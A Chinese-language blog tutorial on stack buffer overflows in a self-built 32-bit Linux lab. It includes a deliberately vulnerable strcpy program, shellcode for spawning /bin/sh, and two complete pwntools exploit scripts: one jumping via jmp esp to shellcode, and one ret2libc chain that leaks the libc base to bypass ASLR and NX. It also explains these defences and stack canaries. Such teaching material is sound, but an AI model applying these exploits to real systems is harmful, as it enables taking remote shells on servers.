---
layout: post # 页面类型
title: 溢出攻击体验 # 标题
subtitle: 在 ASLR 和 NX 下溢出攻击体验 # 子标题
cover-img: /img/stack_overlow_attack/cover.png # 封面图片
tags: [技术] # 标签
comments: true
catalog: true
---

本文带大家认识一下计算机中经常使用的溢出攻击，并认识到攻防犹如阴阳二级难解难分。  

在实际中，溢出攻击常用于获取服务器的 shell（可以理解为命令解析器，相当于控制服务器的程序），而服务器绝大部分使用 Linux 系统，因此后文介绍 Linux 下的溢出攻击。经过实验，同时理论上也如此，攻击方式强相关于软件版本，因为漏洞在不断被修复。如果你也想试试溢出攻击，那么建议完全按照后文环境与配置来配置虚拟机，因为这些软件在版本上也有关联。  

---

## 原理

栈溢出是由于 C 语言系列没有内置检查机制来确保复制到缓冲区的数据不得大于缓冲区的大小，因此当这个数据足够大的时候，将会溢出缓冲区的范围，别有用心得设计溢出部分数据，即可发起攻击。  

![main_idea](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/main_idea.png)  

---

## 汇编复习

&nbsp;  

#### 函数调用

函数调用一般是  

```shell
call < 函数名 >
```

在内存中，程序顺序执行，走到 “ 函数入口地址 ” 即开始 call 。紧接着 4 字节是给函数的返回地址，如果函数有参数，再过 4 字节就是输入该函数的参数。  

![call](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/call.png)  

#### strcpy 函数

strcpy 是栈溢出的明星函数，正如文章开头所说 C 语言系列不检查复制的字符串大小，就一股脑往缓存区复制，如果超过缓冲区大小，就会造成溢出。结合刚才所讲的函数调用，溢出前 “返回地址” 所在位置是 strcpy 的返回地址， strcpy 复制完后会返回到 “返回地址” 所在地址。如果我让超出的代码前 4 字节表示一个地址，这个地址是我写的黑客代码，不就把函数返回变成函数调用的意思了吗，然后就可以花式劫持这台机器了。虽然实际攻击没这么简单，但是原理就是这么简单。  

![strcpy](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/strcpy.png)  

#### esp 寄存器

esp 寄存器是栈指针寄存器，在这里可以理解为在栈上 esp 指向哪里，程序就走到哪里，并且走一步 esp 自动前进一格，除非修改它的值。   

---

## 环境与配置

操作系统：Ubuntu Ubuntu 18.04.4 LTS  
gcc 版本：7.5.0  
python 版本：2.7.17  
IDA 版本：IDA FREE v7.0  
Pwntools  

gcc 版本依赖于 ubuntu 版本  

---

## 普通溢出攻击

&nbsp;  

#### 思想

用 esp+4 覆盖返回地址，那么程序就跳到 esp+4，也就是 “获取 shell 的代码” 的起始位置。  

![esp_4](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/esp_4.png)  

因为每执行一条指令 esp 自动加 4，“jmp esp” 指令是不是等价于 “用 esp+4 覆盖返回地址”？在不清楚当时 esp 具体值的时候，可以填充一个地址，这个地址所指指令永远都是 “jmp esp”。在计算机里真有这样的地址吗？还真有，而且这个地址一直都不变（一定条件下）。由于 c 语言编写的程序都需要链接一个 libc 系统库文件，在 linux 中，一般是 libc.so.6。这个文件里一般就存在 “jmp esp”。而且为了代码复用，这个文件加载地址在内存里是不变的，因为不变才能让所有程序都能调用。  

![jmp_esp](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/jmp_esp.png)  

#### 例子

了解了原理之后就可以动手了。  
  
首先编写一个使用了漏洞函数 strcpy 的程序  

```c++
#include <stdio.h>
#include <string.h>

void copy (char *msg)
{
    char buffer [16];
    strcpy (buffer,msg);
    return;
}

int main ()
{
    puts ("请输入：");
    char buffer [256];
    memset (buffer,0,256);// 清空输入内容区域
    read (0,buffer,256);
    copy (buffer);
    return 0;
}
```

然后在 **root 用户**下关闭系统随机加载  

```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```

在编译时选择关闭程序随机加载，关闭栈保护，关闭不可执行栈（这些名词的含义在后文涉及）  

```shell
gcc -m32 -no-pie -fno-stack-protector -z execstack -o anti_sof anti.c
```

使用 checksec 和 ldd 命令，可以看到这个程序的保护模式，还可以看到这个程序链接了哪些文件和这个文件的加载位置——0xf7ded000。  

```shell
checksec anti_sof
ldd anti_sof
ldd anti_sof
ldd anti_sof
```

![ldd](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/ldd.png)  

由于溢出攻击要在溢出部分使用机器码，传入程序的字符串一般包含非编码字符，没法用键盘键入，因此需要用另一个程序代替我们输入，直接输入含非编码字符的字符串。  
这时引入一个专门用于漏洞开发的工具 pwntools。这个工具可以替我们运行某程序，获取其输出、给予输入。接下来使用 python 编写一个攻击程序。  

首先搜索 libc 文件中 “jmp esp” 指令出现的位置。  

```python
# 搜索 libc.so.6，找到匹配 “jmp esp” 的汇编代码
libc = ELF ('/lib32/libc.so.6')              
jmp_esp = asm ('jmp esp') 
jmp_esp_offset = libc.search (jmp_esp).next ()
```

这个位置是该指令在文件中的位置，真实地址还需加上这个文件的加载地址，文件的加载位置在之前用 ldd 命令已经获取了。  

```python
libc_base = 0xf7ded000 # libc 的加载地址
jmp_esp_addr = libc_base + jmp_esp_offset # 得到 jmp_esp_addr
```

为了溢出，我们就需要找到缓冲区的最大长度，但是缓冲区长度不等于 c 程序中定义的数组长度。有一种简单的方法就是尝试。首先找到最大可以接收输入的长度，然后再一点点增加直至可以攻击成功。精确的方法可以参考
[栈溢出找填充数据大小 - 简书](https://www.jianshu.com/p/278f8d1f8322)  

通过尝试，输入 23 个字符时就报错，然后修改 sof1.py 中填充 buf 的大小从 23 开始，直到溢出攻击成功。  

![attempt](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/attempt.png)  

如果使用我提供的尝试的方法，那得先把后面这部分完成了 —— 构造字符串溢出的部分。
这部分前四个字节当然是之前算出来的 “jmp esp” 指令所在位置，之后加上获取 shell 的代码，一般是 “/bin/sh” 命令。  

```python
buf = '1'* 28 
buf += p32 (jmp_esp_addr)
# “/bin/sh”
buf += '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
```

最后攻击自动化的代码如下  

```python
# -*- coding: utf-8 -*
from pwn import *
p = process ('./anti_sof') # 运行程序
p.recvuntil ("：") # 当遇到 ':' 停止接收
# 搜索 libc.so.6，找到匹配 “jmp esp” 的汇编代码
libc = ELF ('/lib32/libc.so.6')              
jmp_esp = asm ('jmp esp') 
jmp_esp_offset = libc.search (jmp_esp).next ()
libc_base = 0xf7ded000 # libc 的加载地址
jmp_esp_addr = libc_base + jmp_esp_offset # 得到 jmp_esp_addr
buf = '1'* 28 
buf += p32 (jmp_esp_addr)
# “/bin/sh”
buf += '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
p.sendline (buf) # 发送构造后的 buf
p.interactive () # 进入交互
```

&nbsp;

#### 效果

可以看到获取了 shell，并成功创建了文件 attack.txt。这相当于是黑客通过用户名输入窗口获得了控制服务器的程序，接下来就可以为所欲为了。  

![first_attack](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/first_attack.png)  

---

## ASLR 与 NX

有没有针对上述攻击方式的防御方法呢？  
当然有了，那就是 ASLR 与 NX，分别是随机地址加载和非执行栈。随机地址加载目的是防止系统文件加载地址泄露，由于系统文件的加载地址是随机的，那么通过 ldd 等方式只能得到当前加载位置，下一次可就不一样了。非执行栈目的是防止栈上出现了 shellcode，就是之前我们在字符串后面加上的 “/bin/sh” 命令。本身那部分栈是缓冲区，存放的是数据，本就不应该被执行，那么直接加上限制，要是 jmp 到了栈上，就认定这是非法的，然后拦截这个操作，从而无法获取 shell。  

#### 效果

可以看到没法获取 shell，程序报错终止了。

![first_anti](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/first_anti.png)  

---

## 在 ASLR 与 NX 下攻击

那在开启了 ASLR 与 NX 后还有攻击方法吗？  
当然有了，那就是基址泄露与 ret2libc。Ret2libc 读作 “return to libc”，意思是覆盖 return 地址，使其跳转至 libc 文件中。  

**获取基址**  

由于程序需要重定位，因此存在两个表 PLT 和 GOT。GOT（Global Offset Table）称为全局偏移表，PLT（Procedure Link Table）称为程序链接表，其关系如下图。  

![got](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/got.png)  

而获取基址的常用思路是调用 PLT 表中具有输出功能的函数 (常用 puts/write/printf)，用其将 GOT 表中的某个 libc 函数地址打印出来，通过该函数地址在文件中的偏移量分析得出 libc 基址。将 main 的地址作为返回地址，即可回到 main，从而防止程序被再次加载使得 libc 的基址发生变化。执行到漏洞函数，而后二次触发溢出，再考虑如何获取 shell。  

![get_libc_base](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/get_libc_base.png)  

**ret2libc**  

一般情况下，选择执行 system ("/bin/sh")，含义是打开 shell。在获得了 libc 的基址的情况下，只需找到 system 函数和字符串 “/bin/sh” 在 libc.so.6 中的偏移地址即可。为什么 libc.so.6 中会有 system 函数以及字符串 “/bin/sh” 呢？其实应该反过来思考，这是攻击方式，想出用这种方式进行溢出攻击的大神是多么精通 c 语言，以至于想得到 libc.so.6 中还有这样的漏洞。  

![ret2libc](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/ret2libc.png)  

由于获取了 shell，所以 system 函数的返回地址就没有意义了。  

#### 例子

首先在 root 用户下打开系统地址随机化。  

```shell
echo 1 > /proc/sys/kernel/randomize_va_space
```

并在编译 anti.c 时选择关闭程序随机化、栈保护，即打开不可执行栈。  

```shell
gcc -m32 -no-pie  -fno-stack-protector -o anti_sof anti.c
```

通过 checksec 和 ldd 命令可以看到该程序开启不可执行栈，并且系统文件被随机加载。  

![ldd2](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/ldd2.png) 

###### 获取基址

这里选择调用 puts 函数，因为在 ida 中可以看到该程序调用了它。__libc_start_main 是 libc 中的一个函数，在程序进入 main 的初始化工作时会被调用，由于它一定会被调用，因此选择打印它的地址。于是需要通过 ida 找到四个地址，在原程序中的 puts 函数的入口地址，main 的入口地址，__libc_start_main 在 GOT 中的地址，以及 libc.so.6 中__libc_start_main 的偏移地址。  

puts 函数入口地址为 0x08048360。  

![puts](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/puts.png)  
 
main 函数入口地址为 0x080484E1。  

![main](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/main.png)  
 
__libc_start_main 在 GOT 中的地址为 0x0804A018。  

![libc_start_main](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/libc_start_main.png)  

这时 puts 函数就将__libc_start_main 的地址当作字符串打印出来了。无需关心字符串有多长，只需要截取前 4 字节就是__libc_start_main 的地址。  

```python
libc_start_main_addr_str = p.recv (4) # __libc_start_main 的地址
libc_start_main_addr = u32 (libc_start_main_addr_str) # 转为 int
```

__libc_start_main 在 libc.so.6 中的偏移地址为 0x00018E30。  

![libc_base](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/libc_base.png)  

现在将__libc_start_main 的地址减去其偏移地址即可得到 libc.so.6 的基址。  

```python
libc_base = libc_start_main_addr - 0x00018E30
```

&nbsp;

###### ret2libc

这里使用 system ("/bin/sh") 代替直接将 shellcode 写在栈上。由于之前获得了 libc.so.6 的基址，这只需要找到其中的两个偏移地址即可，分别是 system 函数入口偏移地址，“/bin/sh” 字符串偏移地址。  

system 函数入口偏移地址为 0x0003CE10。  

![system](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/system.png)  
 
“/bin/sh” 字符串偏移地址为 0x0017B88F。  

![bin_sh](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/bin_sh.png)  

```python
system_addr = libc_base + 0x0003CE10 # puts 函数入口地址
bin_sh_addr = libc_base + 0x0017B88F # "/bin/sh" 所在地址
```

最后攻击自动化的代码如下  

```python
# -*- coding: utf-8 -*
from pwn import *

p = process ('./anti_sof') # 运行程序
p.recvuntil ("：") # 当遇到 '：' 停止接收

# 获取基址
buf = '1' * 28
buf += p32 (0x08048360) # puts 函数入口地址
buf += p32 (0x080484E1) # main 函数入口地址
buf += p32 (0x0804A018) # __libc_start_main 在 GOT 中的地址
p.sendline (buf)
p.recvuntil ('\n') 

libc_start_main_addr_str = p.recv (4) # __libc_start_main 的地址
libc_start_main_addr = u32 (libc_start_main_addr_str) # 转为 int
libc_base = libc_start_main_addr - 0x00018E30

# ret2libc
system_addr = libc_base + 0x0003CE10 # puts 函数入口地址
bin_sh_addr = libc_base + 0x0017B88F # "/bin/sh" 所在地址

buf = '1' * 28
buf += p32 (system_addr)
buf += p32 (system_addr) # 任意地址
buf += p32 (bin_sh_addr)
p.sendline (buf)

p.interactive ()
```

&nbsp;

#### 效果

可以看到获取了 shell，并成功创建了文件 attack2.py。  

![second_attack](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/second_attack.png)  

---

## 结语

可以预见如果打开程序随机加载和栈保护，那么上述攻击方式又失效了。  

![second_anti](https://bobbybby.oss-cn-zhangjiakou.aliyuncs.com/img/stack_overlow_attack/second_anti.png)  

对于程序随机加载，因为我们在查找 puts 函数时，使用的是绝对地址，如果程序也随机加载，那么这个地址就是相对程序加载地址的偏移地址，也就没法进行跳转了。  
栈保护一般使用 “ Canaries ” 探测。在缓冲区和 EBP 间插入一个 canary word ，这样当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。这样的话，就没法简单通过覆盖返回地址进行攻击了。  
那么开启了程序随机加载和栈保护之后还有攻击方法吗？  
当然有了！  
针对程序随机加载，可以参考 [PIE 保护详解和常用 bypass 手法 - 先知社区](https://xz.aliyun.com/t/6922)  
那针对上述攻击方式有防御方法吗？  
当然有了！  
……？  
当然有了！  
……？  
当然有了！  
……？  
还有吗？  

总的来说，溢出攻击核心思想是如何通过修改 return 地址，跳出足够优雅的舞步绕开系统的保护，最后夺得权杖上的明珠。  